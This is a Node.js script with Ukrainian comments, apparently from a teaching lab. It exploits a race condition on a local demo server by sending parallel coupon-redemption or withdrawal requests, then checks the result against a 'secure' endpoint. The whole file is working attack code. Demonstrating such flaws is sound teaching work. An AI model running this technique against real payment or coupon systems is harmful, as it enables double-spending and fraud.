// Скрипт атаки: N паралельних запитів до ендпоінта
// Використання: node attack.js [redeem|withdraw] [secure] [N]
//   node attack.js redeem          — 20 паралельних застосувань одного купона
//   node attack.js withdraw        — 20 паралельних знять по 100 з балансу 100
//   node attack.js redeem secure   — те саме на захищеному ендпоінті

const BASE = 'http://127.0.0.1:3019';
const [kind = 'redeem', mode = '', n = '20'] = process.argv.slice(2);
const secure = mode === 'secure';
const N = Number(secure ? n : (mode || n)) || 20;

const endpoint = `/${kind}${secure ? '-secure' : ''}`;
const body = kind === 'redeem' ? { code: 'BONUS50' } : { amount: 100 };

(async () => {
    await fetch(BASE + '/api/reset', { method: 'POST' });
    console.log(`Скидаємо стан. Відправляємо ${N} паралельних запитів на ${endpoint}…`);

    const results = await Promise.all(
        Array.from({ length: N }, () =>
            fetch(BASE + endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            }).then(r => r.json())
        )
    );

    const ok = results.filter(r => r.success).length;
    const state = await (await fetch(BASE + '/api/state')).json();
    console.log(`Успішних: ${ok} з ${N}`);
    console.log(`Фінальний баланс: ${state.balance}  (очікувано: ${kind === 'redeem' ? 150 : 0})`);
    console.log(ok > 1 ? '🔴 RACE CONDITION ЕКСПЛУАТОВАНО' : '🟢 Операція виконалась рівно один раз');
})().catch(e => {
    console.error('Помилка. Чи запущено сервер (npm start)?', e.message);
    process.exit(1);
});
